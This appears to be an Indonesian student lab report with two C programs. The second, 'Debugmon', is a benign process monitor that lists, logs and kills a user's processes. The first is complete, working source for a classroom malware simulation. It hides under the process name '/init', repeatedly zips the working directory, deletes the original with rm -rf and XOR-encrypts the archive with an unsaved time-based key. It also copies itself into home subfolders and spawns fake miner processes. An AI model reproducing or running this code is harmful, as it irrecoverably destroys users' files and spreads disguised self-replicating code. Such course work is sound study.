Pada revisi ini, kami memastikan bahwa folder yang digunakan untuk operasi enkripsi dan ZIP adalah direktori kerja saat ini (CWD), yang diperoleh menggunakan fungsi `getcwd()`. Hal ini memungkinkan malware untuk mengenkripsi dan memodifikasi file dalam folder yang saat ini aktif.

Contoh implementasi untuk mendapatkan CWD:
```c
char cwd[PATH_MAX];
if (getcwd(cwd, sizeof(cwd)) == NULL) {
    perror("getcwd failed");
    exit(EXIT_FAILURE);
}
```
## 3. Pengecekan untuk Enkripsi dan ZIP

Pengecekan tambahan telah ditambahkan untuk memastikan bahwa proses enkripsi dan ZIP berjalan dengan benar. Pengecekan ini dilakukan setelah setiap perintah zip dan xorfile untuk memastikan bahwa file berhasil dienkripsi dan di-zip sebelum melanjutkan ke langkah berikutnya.

Contoh pengecekan untuk memastikan ZIP berhasil:
```c
int status;
pid_t zip_pid = fork();
if (zip_pid == 0) {
    // Proses zip
    execlp("zip", "zip", "-r", "-q", zipfile, folder_path, (char *)NULL);
    exit(EXIT_FAILURE);  // Jika execlp gagal
} else if (zip_pid > 0) {
    waitpid(zip_pid, &status, 0);  
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        // ZIP berhasil
        pid_t rm_pid = fork();
        if (rm_pid == 0) {
            // Menghapus folder asli setelah ZIP berhasil
            execlp("rm", "rm", "-rf", folder_path, (char *)NULL);
            exit(EXIT_FAILURE);  // Jika execlp gagal
        } else if (rm_pid > 0) {
            waitpid(rm_pid, &status, 0); 
            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                // Lanjut ke enkripsi XOR setelah ZIP berhasil
                xorfile(zipfile, key);
            }
        }
    } else {
        // Jika ZIP gagal
        fprintf(stderr, "ZIP failed!\n");
    }
}

```
## FINAL code setelah REVISI
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <time.h>
#include <limits.h>
#include <syslog.h>
#include <sys/wait.h>

#define PATH_MAX 4096
extern char **environ;

void initialize_daemon() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) exit(EXIT_FAILURE);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);

    umask(0);
    if (chdir("/") != 0) exit(EXIT_FAILURE);

    for (int fd = 0; fd < sysconf(_SC_OPEN_MAX); fd++) {
        close(fd);
    }
}

void disguise_process(int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, "/init", 0, 0, 0);
    if (argc > 0 && argv[0]) {
        memset(argv[0], 0, strlen(argv[0])); 
        snprintf(argv[0], 64, "/init    "); 
    }
}

void xorfile(const char *filename, unsigned int key) {
    FILE *in = fopen(filename, "rb");
    if (!in) return;

    char tmpfile[PATH_MAX];
    snprintf(tmpfile, sizeof(tmpfile), "%s.tmp", filename);
    FILE *out = fopen(tmpfile, "wb");
    if (!out) {
        fclose(in);
        return;
    }

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key, out);
    }

    fclose(in);
    fclose(out);

    remove(filename);
    rename(tmpfile, filename);
}

void encrypt_file(const char *folder_path, unsigned int key) {
    char zipfile[PATH_MAX];
    snprintf(zipfile, sizeof(zipfile), "%s.zip", folder_path);

    pid_t zip_pid = fork();
    if (zip_pid == 0) {
        execlp("zip", "zip", "-r", "-q", zipfile, folder_path, (char *)NULL);
        exit(EXIT_FAILURE);
    } else if (zip_pid > 0) {
        int status;
        waitpid(zip_pid, &status, 0);  
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            pid_t rm_pid = fork();
            if (rm_pid == 0) {
                execlp("rm", "rm", "-rf", folder_path, (char *)NULL);
                exit(EXIT_FAILURE);
            } else if (rm_pid > 0) {
                waitpid(rm_pid, &status, 0); 
                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                    xorfile(zipfile, key);
                }
            }
        }
    }
}

void replicate_self_to_home(const char *home_dir) {
    DIR *dir = opendir(home_dir);
    if (!dir) return;

    struct dirent *entry;
    char current_path[PATH_MAX];
    char self_path[PATH_MAX];

    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) {
        closedir(dir);
        return;
    }
    self_path[len] = '\0';
    const char *filename = strrchr(self_path, '/');
    filename = filename ? filename + 1 : self_path;

    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        snprintf(current_path, sizeof(current_path), "%s/%s", home_dir, entry->d_name);
        struct stat st;
        if (stat(current_path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            char destination[PATH_MAX];
            snprintf(destination, sizeof(destination), "%s/%s", current_path, filename);
            FILE *src = fopen(self_path, "rb");
            FILE *dest = fopen(destination, "wb");
            if (!src || !dest) {
                if (src) fclose(src);
                if (dest) fclose(dest);
                continue;
            }
            char buffer[4096];
            size_t bytes;
            while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                fwrite(buffer, 1, bytes, dest);
            }
            fclose(src);
            fclose(dest);
        }
    }

    closedir(dir);
}

void child_wannacryptor(const char *target_path, unsigned int key, int argc, char **argv) {
    pid_t child = fork();
    if (child == 0) {
        prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "wannacryptor", 64);
        }
        while (1) {
            encrypt_file(target_path, key);
            sleep(30);
        }
        exit(EXIT_SUCCESS); 
    }
}

void child_trojan_wrm(int argc, char **argv) {
    pid_t child = fork();
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "trojan.wrm", 64);
        }

        const char *home_dir = getenv("HOME");
        if (!home_dir) exit(EXIT_FAILURE);

        while (1) {
            replicate_self_to_home(home_dir);
            sleep(30);
        }
        exit(EXIT_SUCCESS); 
    }
}

void mine_crafter(int id) {
    prctl(PR_SET_NAME, "mine-crafter", 0, 0, 0); 
    char name[64];
    snprintf(name, sizeof(name), "mine-crafter-%d", id);

    memset((void*)environ[0], 0, strlen(environ[0]));
    strncpy(environ[0], name, strlen(name));

    prctl(PR_SET_PDEATHSIG, SIGTERM);

    srand(time(NULL) ^ id);
    char hash[65];

    while (1) {
        for (int i = 0; i < 64; i++) {
            hash[i] = "0123456789abcdef"[rand() % 16];
        }
        hash[64] = '\0';

        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char log_entry[128];
        snprintf(log_entry, sizeof(log_entry),
                 "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
                 t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                 t->tm_hour, t->tm_min, t->tm_sec, id, hash);

        FILE *log = fopen("/tmp/.miner.log", "a");
        if (log) {
            fputs(log_entry, log);
            fclose(log);
        }

        sleep((rand() % 28) + 3); 
    }
}

void child_rodok(int argc, char **argv) {
    pid_t rodok = fork();
    if (rodok == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "rodok.exe", 64);
        }

        for (int i = 0; i < 5; i++) {
            pid_t miner = fork();
            if (miner == 0) {
                mine_crafter(i);
                exit(EXIT_SUCCESS); 
            }else {
                waitpid(miner, NULL , 0);
                }
        }

        while (1) {
            sleep(60);
        }
        exit(EXIT_SUCCESS); 
    }
}

int main(int argc, char *argv[]) {
    char cwd[PATH_MAX];
    if (getcwd(cwd, sizeof(cwd)) == NULL) {
        perror("getcwd failed");
        exit(EXIT_FAILURE);
    }

    initialize_daemon();
    disguise_process(argc, argv);
    child_wannacryptor(cwd, (unsigned int)time(NULL), argc, argv);
    child_trojan_wrm(argc, argv);
    child_rodok(argc, argv);

    while (1) {
        sleep(60);
        wait(NULL);
    }
    return 0;
}

```
  
# Soal 4
Membuat program Debugmon yang bisa:
- a. Menampilkan proses milik user
- b. Menjalankan daemon untuk memonitor proses tersebut
- c. Memblokir (kill) semua proses milik user
- d. Mengizinkan user kembali menjalankan proses
- e. Menghentikan daemon
- f. Melakukan pencatatan dan penyimpanan ke dalam file debugmon.log
```
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/types.h>
#include <ctype.h>
#include <time.h>
#include <sys/stat.h>
#include <signal.h>


void show_menu() {
printf("\033[1;36m=====================================================\033[0m\n");
printf("\033[1;33m                   DEBUGMON MENU                     \033[0m\n");
printf("\033[1;36m=====================================================\033[0m\n");
printf("\033[1;31mGunakan Perintah:\033[0m ./debugmon <command> <username>\n\n");

printf("\033[1;33mCommand yang tersedia:\033[0m\n");
printf("  \033[1;34mlist\033[0m     : Menampilkan semua proses user\n");
printf("  \033[1;34mdaemon\033[0m   : Menjalankan debugmon sebagai daemon\n");
printf("  \033[1;34mstop\033[0m     : Menghentikan proses debugmon daemon\n");
printf("  \033[1;34mfail\033[0m     : Menghentikan semua proses user dan memblokir\n");
printf("  \033[1;34mrevert\033[0m   : Mengizinkan user kembali menjalankan proses\n\n");

printf("Log disimpan di file: \033[1;35mdebugmon.log\033[0m\n");
printf("\033[1;36m=====================================================\033[0m\n");
}


void write_log(const char *proc_name, const char *status) {
FILE *log = fopen("debugmon.log", "a");
if (!log) return;

time_t now = time(NULL);
struct tm *t= localtime(&now);

char timestamp[64];
strftime(timestamp, sizeof(timestamp), "[%d:%m:%Y]-[%H:%M:%S]", t);
fprintf(log, "%s_%s_%s\n", timestamp, proc_name, status);
fclose(log);
}

void list_processes(const char *username) {
struct passwd *pw = getpwnam(username);
if (pw == NULL) {
printf("User %s tidak ditemukan.\n", username);
return;
}

uid_t target_uid = pw->pw_uid;

DIR *proc = opendir("/proc");
if (!proc) {
perror("opendir");
return;
}

struct dirent *entry;

printf("PID\tCMD\t\tCPU\tMEM\n");

while ((entry = readdir(proc)) !=NULL) {
if (entry->d_type == DT_DIR) {
int is_pid = 1;
for (int i = 0; entry->d_name[i] != '\0'; i++) {
if (entry->d_name[i] < '0' || entry->d_name[i] > '9') {
is_pid = 0;
break;
}
}

if (!is_pid) continue;

char status_path[512];
snprintf(status_path, sizeof(status_path), "/proc/%s/status", entry->d_name);

FILE *status = fopen(status_path, "r");
if (!status) continue;

uid_t uid = -1;
char name [256] = "";
char line[256];

while (fgets(line, sizeof(line), status)) {
if (strncmp(line, "Uid:", 4) == 0) {
sscanf(line, "Uid:\t%d", &uid);
}
if (strncmp(line, "Name:", 5) == 0) {
sscanf(line, "Name:\t%s", name);
}
}

fclose(status);

if (uid == target_uid) {
char stat_path[512];
snprintf(stat_path, sizeof(stat_path), "/proc/%s/stat", entry->d_name);

FILE *stat = fopen(stat_path, "r");
if (!stat) continue;

int pid;
char comm[256];
char state;
long unsigned utime, stime;
fscanf(stat, "%d %s %c", &pid, comm, &state);

for (int i = 0; i < 10; i++) fscanf(stat, "%*s");
fscanf(stat, "%lu %lu", &utime, &stime);
fclose(stat);

float cpu_usage = (float)(utime + stime) / sysconf(_SC_CLK_TCK);

long mem_kb = 0;
FILE *status2 = fopen(status_path, "r");
if (status2) {
while (fgets(line, sizeof(line), status2)) {
if (strncmp(line, "VmRSS:", 6) == 0) {
sscanf(line, "VmRSS: %ld", &mem_kb);
break;
}
}
fclose(status2);
}
printf("%s\t%s\t\t%.2f\t%ld KB\n", entry->d_name, name, cpu_usage, mem_kb);
}
}
}
closedir(proc);
}


void start_daemon(const char *username) {
pid_t pid = fork();
if (pid < 0) exit(EXIT_FAILURE);
if (pid > 0) exit(EXIT_SUCCESS);

setsid();
fclose(stdin);
fclose(stdout);
fclose(stderr);

FILE *pidfile = fopen("debugmon.pid", "w");
fprintf(pidfile, "%d\n", getpid());
fclose(pidfile);

while (1) {
DIR *proc = opendir("/proc");
if (!proc) exit(EXIT_FAILURE);
struct dirent *entry;

struct passwd *pw = getpwnam(username);
if (!pw) exit(EXIT_FAILURE);
uid_t target_uid = pw->pw_uid;

while ((entry = readdir(proc)) != NULL) {
if (entry->d_type != DT_DIR) continue;

int is_pid = 1;
for (int i = 0; entry->d_name[i] != '\0'; i++) {
if (!isdigit(entry->d_name[i])) {
is_pid = 0;
break;
}
}

if (!is_pid) continue;

char status_path[512];
snprintf(status_path, sizeof(status_path), "/proc/%s/status", entry->d_name);
FILE *status = fopen(status_path, "r");
if (!status) continue;

uid_t uid = -1;
char name[256] = "";
char line[256];

while (fgets(line, sizeof(line), status)) {
if (strncmp(line, "Uid:", 4) == 0) sscanf(line, "Uid:\t%d", &uid);
if (strncmp(line, "Name:", 5) == 0) sscanf(line, "Name:\t%s", name);
}
fclose(status);

if (uid == target_uid) {
write_log(name, "RUNNING");
}
}
closedir(proc);
sleep(5);
}
}


void stop_daemon(const char *username) {
FILE *pidfile = fopen("debugmon.pid", "r");
if (!pidfile) {
printf("PID file tidak ditemukan. Apakah daemon sedang berjalan?\n");
return;
}

int pid;
fscanf(pidfile, "%d", &pid);
fclose(pidfile);

if (kill(pid, SIGTERM) == 0) {
printf("Daemon dihentikan (PID: %d).\n", pid);
write_log("debugmon", "RUNNING");
remove("debugmon.pid");
} else {
perror("Gagal menghentikan daemon");
}
}


void fail_user(const char *username) {
struct passwd *pw = getpwnam(username);
if (!pw) {
printf("User %s tidak ditemukan.\n", username);
return;
}

uid_t target_uid = pw->pw_uid;

char blockfile[256];
snprintf(blockfile, sizeof(blockfile), ".debugmon_blocked_%s", username);
FILE *f = fopen(blockfile, "w");
if (f) fclose(f);

DIR *proc = opendir("/proc");
if (!proc) {
perror("opendir");
return;
}

struct dirent *entry;

while ((entry = readdir(proc)) != NULL) {
if (entry->d_type != DT_DIR) continue;

int is_pid = 1;
for (int i = 0; entry->d_name[i]; i++) {
if (!isdigit(entry->d_name[i])) {
is_pid = 0;
break;
}
}

if (!is_pid) continue;

char status_path[512];
snprintf(status_path, sizeof(status_path), "/proc/%s/status", entry->d_name);

FILE *status = fopen(status_path, "r");
if (!status) continue;

uid_t uid = -1;
char name[256] = "";
char line[256];

while (fgets(line, sizeof(line), status)) {
if (strncmp(line, "Uid:", 4) == 0)
sscanf(line, "Uid:\t%d", &uid);
if (strncmp(line, "Name:", 5) == 0)
sscanf(line, "Name:\t%s", name);
}
fclose(status);

if (uid == target_uid) {
pid_t pid = atoi(entry->d_name);
kill(pid, SIGKILL);
write_log(name, "FAILED");
}
}

closedir(proc);
printf("Semua proses milik %s dihentikan dan user diblokir.\n", username);
}


void revert_user(const char *username) {
struct passwd *pw = getpwnam(username);
if (!pw) {
printf("User %s tidak ditemukan.\n", username);
return;
}

uid_t target_uid = pw->pw_uid;

char blockfile[256];
snprintf(blockfile, sizeof(blockfile), ".debugmon_blocked_%s", username);

if (remove(blockfile) == 0) {
printf("User %s dapat kembali menjalankan proses.\n", username);
write_log("debugmon", "RUNNING");
} else {
printf("Tidak dapat menghapus file blokir untuk user %s.\n", username);
}
}


int main(int argc, char *argv[]) {
if (argc < 3) {
show_menu();
return 1;
}

if (strcmp(argv[1], "list") == 0) {
list_processes(argv[2]);
} else if (strcmp(argv[1], "daemon") == 0) {
start_daemon(argv[2]);
} else if (strcmp(argv[1], "stop") == 0) {
stop_daemon(argv[2]);
} else if (strcmp(argv[1], "fail") == 0) {
fail_user(argv[2]);
} else if (strcmp(argv[1], "revert") == 0) {
revert_user(argv[2]);
} else {
printf("Perintah tidak dikenal.\n");
show_menu();
}
return 0;
}
```
Penjelasan code
Perintah ini:
- **./debugmon list <user>** akan menampilkan daftar semua proses milik user tersebut (PID, command, CPU, dan memori)
- **./debugmon daemon <user>** program akan berjalan di latar belakang (daemon) dan mencatat aktivitas proses ke debugmon.log (*tail -f debugmon.log* untuk melihat proses yang sedang berlangsung)
- **./debugmon stop <user>** akan menghentikan mode daemon
- **./debugmon fail <user>** semua proses user akan dimatikan dan user tidak bisa menjalankan proses baru dan ini akan dicatat di log sebagai FAILED
- **./debugmon revert <user>** menghapus status blokir agar user bisa menjalankan proses lagi dan akan dicatat di log sebagai RUNNING
- **cat debugmon.log** untuk melihat semua proses yang dijalankan

# REVISI
pada fitur **d.** Menggagalkan semua proses user yang sedang berjalan dengan mengetik   *./debugmon fail <user>*   tidak tercatat ke dalam log (debugmon.log) sebagai **FAILED** karena ada kemungkinan semua proses milik user telah di-kill duluan sebelum sempat mencatat statusnya. Maka solusi pada masalah ini sebelumnya dengan menambahkan perintah sleep 2 sebelum fail agar memberi waktu pada debugmon untuk mencatat aktivitas user ke log sebelum proses benar-benar dimatikan.
- **revisi pada code** 
```
if (uid == target_uid) {
pid_t pid = atoi(entry->d_name);
kill(pid, SIGKILL);
write_log(name, "FAILED");
}

//membalik urutan dengan menulis write_log terlebih dahulu sebelum kill

if (uid == target_uid) {
pid_t pid = atoi(entry->d_name);
write_log(name, "FAILED");
kill(pid, SIGKILL);
}
```
dengan membalik urutannya write_log sempat mencatat nama proses dan statusnya, setelah itu baru proses di-kill dengan SIGKILL
